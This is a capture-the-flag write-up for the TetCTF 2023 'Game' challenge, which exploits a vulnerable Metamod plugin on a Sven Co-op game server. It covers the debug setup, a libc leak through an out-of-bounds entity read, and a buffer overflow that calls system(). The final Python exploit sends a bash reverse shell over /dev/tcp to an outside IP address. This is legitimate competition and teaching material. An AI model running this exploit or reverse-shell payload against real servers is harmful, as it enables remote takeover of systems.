---
title: "TetCTF 2023 - Game"
date: 2023-01-03T01:11:28+07:00
draft: false
description: "A small writeup for a pwn challenge called Game in TetCTF"
---

# Table of Contents
1. [Overview](#overview)
2. [Description](#description)
3. [First Tackles](#first-tackles)
4. [Environment Setup](#environment-setup)
5. [Exploiting](#exploiting)

# Overview
This week I played TetCTF with team `The South Gang` (purf3ct x blackpinkEx) and we manage to get second place overall. Although there's no Reverse Engineer category (which I mainly do), me and my friends encounter a really interesting pwn challenge which is really nice and also really fun to solve, and here's my writeup about it.

# Description
`I wrote a Metamod plugin to retrieve the classname of any entities on a running Sven Co-Op game server. I have installed it on my server, but something unexpected happen and I haven't got the time to test my plugin yet. Can you test it for me?`

[Link of given files](https://drive.google.com/file/d/1ONe7x2IFUkye7nkxgdP6tqZEob-nr88R/view?usp=share_link)

# First Tackles
This is not an ordinary ctf pwn challenge. Instead, we're being given a vulnerable metamod plugin and a game server of a game called `sven-coop`, the plugin can be used by all players when they connect to the server. This is the case where if the plugin is not secure enough, attackers can compromise the game server via that plugin.

First we need to understand a few ideas how this plugin and the whole engine works. After some googling, here's what I found:
  - `sven-coop` use GoldSrc engine, which is a Half-Life supported game engine. There are other engines that's identical to this one and we can use them as references.
  - This metamod plugin engine will hook game server's functions, interfere some features of the game and customize them in our own way by plugins. Which means that all the file that is being given to us, only this piece code is matter:

```c
static int ConnectionlessPacket(const struct netadr_s *net_from, const char *args, char *response_buffer, int *response_buffer_size) {
    edict_t *ent = ENT(atoi(++args));
    strcpy(response_buffer, STRING(ent->v.classname));
    *response_buffer_size = strlen(response_buffer);

    RETURN_META_VALUE(MRES_SUPERCEDE, 1);
}
```

  - We also need to find a way to trigger `ConnectionlessPacket` event. After another hour of searching, I found this [link](https://developer.valvesoftware.com/wiki/Counter-Strike:_Global_Offensive_Network_Channel_Encryption) which looks promissing. In short we can trigger the event by sending a UDP packet with 4 `\xff` bytes at the beginning.

We have everything we need to go to the next step.

# Environment Setup
Luckily, author provides us a `Dockerfile` which we can use to create a game server on docker. I modified `Dockerfile` a little bit so I can easily debug the code:

```Docker
FROM ubuntu:20.04

ENV DEBIAN_FRONTEND=noninteractive
RUN dpkg --add-architecture i386
RUN apt-get update && apt-get -y upgrade
RUN apt-get update && apt-get -y install lib32stdc++6 lib32gcc-s1 ca-certificates curl libssl1.1:i386 zlib1g:i386

RUN apt-get install gdb wget binutils file -y
RUN apt-get install python3 -y

ADD --chown=root:root flag /flag
RUN chmod 444 /flag
RUN useradd -m game
USER game
RUN mkdir /home/game/Steam
WORKDIR /home/game/Steam
RUN curl -sqL "https://steamcdn-a.akamaihd.net/client/installer/steamcmd_linux.tar.gz" | tar zxvf -
RUN ./steamcmd.sh +force_install_dir /home/game/svends +login anonymous +app_update 276060 validate +exit
RUN mkdir -p /home/game/.steam/sdk32/
RUN ln -s /home/game/Steam/linux32/steamclient.so /home/game/.steam/sdk32/steamclient.so
WORKDIR /home/game/svends
RUN mkdir -p svencoop/addons/metamod/dlls
ADD --chown=game:game metamod.so /home/game/svends/svencoop/addons/metamod/dlls/metamod.so
RUN echo linux addons/note_mm/note_mm.so > svencoop/addons/metamod/plugins.ini
RUN ln -s /home/game/svends/svencoop/dlls/server.so /home/game/svends/svencoop/dlls/hl_i386.so
RUN mkdir svencoop/addons/note_mm

# For gdb - gef
RUN wget -O ~/.gdbinit-gef.py -q https://gef.blah.cat/py
RUN echo source ~/.gdbinit-gef.py >> ~/.gdbinit

# For IDA
COPY ./linux_server64 ./linux_server64

ADD --chown=game:game note_mm.so /home/game/svends/svencoop/addons/note_mm/note_mm.so
```

Run the following command to build and spawn a shell in game server:

```
sudo docker build -t game_tetctf . && sudo docker run --net=host -it game_tetctf
```

Run the following command to debug with gdb:

```bash
export LD_LIBRARY_PATH=".:bin:$LD_LIBRARY_PATH"
export LC_CTYPE=C.UTF-8
gdb ./svends_amd    # Depends on the architecture of your computer.

# At this point you can breakpoint anywhere and run the program to start game server.
run -dll addons/metamod/dlls/metamod.so +sv_password $CS_PASSWORD +log on +maxplayers 8 +map stadium4
```

To debug with IDA, simply start `linux_server64` and debug with option `Remote Linux debugger` with this argument:

```
-dll addons/metamod/dlls/metamod.so +sv_password $CS_PASSWORD +log on +maxplayers 8 +map stadium4
```

To test my theory about triggering `ConnectionlessPacket` event, I write a small python script to send my packet to the server:

```py
import socket
from pwn import *

r = remote("127.0.0.1", 27015, typ="udp",fam="ipv4")

MESSAGE = b"\xff\xff\xff\xffabcdef"
r.send(MESSAGE)

print(r.recv())
```

And it works!

```bash
nguyenguyen753@mochi:~/Desktop/CTF/tetCTF/game$ python3.8 solve.py 
[+] Opening connection to 127.0.0.1 on port 27015: Done
b'\xff\xff\xff\xffworldspawn'
[*] Closed connection to 127.0.0.1 port 27015
```

# Exploiting

This is plugin code in IDA:

```c
int __cdecl ConnectionlessPacket(int a1, int controlled_input, char *victim, int a4)
{
  int v4; // eax
  int *v5; // eax
  size_t v6; // eax
  _DWORD *v7; // ecx
  int result; // eax

  v4 = strtol((const char *)(controlled_input + 1), 0, 10);// we can control v4
  v5 = (int *)g_engfuncs[69](v4);               // PEntityOfEntOffset
  strcpy(victim, (const char *)(gpGlobals[38] + v5[32]));
  v6 = strlen(victim);
  v7 = (_DWORD *)gpMetaGlobals;
  *(_DWORD *)a4 = v6;
  result = 1;
  *v7 = 4;
  return result;
}
```

The plugin will find the desired entity by an entity id, and return that entity's name to us. In a situation where we provide an invalid entity id, it will read an abitrary memory region and return those values in that memory to us. If somehow we can control the entity id that can lead us to a desired memory region, we will have arbitrary read primitive! Which we can use to leak libc:

```py
MESSAGE = b"\xff\xff\xff\xffa" + b"266746450" + p32(0x2270c)
r.send(MESSAGE)

base_addr = u32(r.recv()[4:8]) - 0x18f6d60

PREFIX=b'\xff\xff\xff\xffa266746450'
r.send(PREFIX + p32(141068))
res = r.recv()
leak = u32(res[4:8])
libc.address = leak - 0x82d60
info('libc base: 0x%x' % libc.address)  
```

While debugging, I found that `SVC_GameDllQuery` will call our function from the plugin by tracing the call stack. And github leads us to this [code](https://github.com/dreamstalker/rehlds/blob/5e8b0ba616c571646c4fc67b188d1a630650d928/rehlds/engine/sv_main.cpp#L3173). In general, the response will be copied to a buffer with the size of 4096 bytes, and we can overflow this.

And finally to create a reverse shell on the game server, we use `system` call to connect to our own server and that's our final piece to complete the exploit.

```py
import socket
from pwn import *

libc = ELF('./libc-2.31.so')
r = remote("game.hackemall.live", 62675, typ="udp",fam="ipv4")

MESSAGE = b"\xff\xff\xff\xffa" + b"266746450" + p32(0x2270c)
r.send(MESSAGE)

base_addr = u32(r.recv()[4:8]) - 0x18f6d60

PREFIX=b'\xff\xff\xff\xffa266746450'
r.send(PREFIX + p32(141068))
res = r.recv()
leak = u32(res[4:8])
libc.address = leak - 0x82d60
info('libc base: 0x%x' % libc.address)
system = libc.sym['system']

cmd = b'/bin/bash -c "/bin/bash -i >& /dev/tcp/134.209.109.144/9999 0>&1"'

MESSAGE = b"\xff\xff\xff\xffa" + b"266746450" + p32(0x158224e)
MESSAGE += cmd + b';'
MESSAGE = MESSAGE.ljust(0x82a, b'b')
MESSAGE += p32(system)
MESSAGE += b'a'*4
MESSAGE += p32(libc.address - 0x2271ae)
r.send(MESSAGE)
```

![](https://i.imgur.com/0EgASEa.png)

`TetCTF{https://www.youtube.com/watch?v=RQmEERvqq70}`

> Happy new years everyone!!!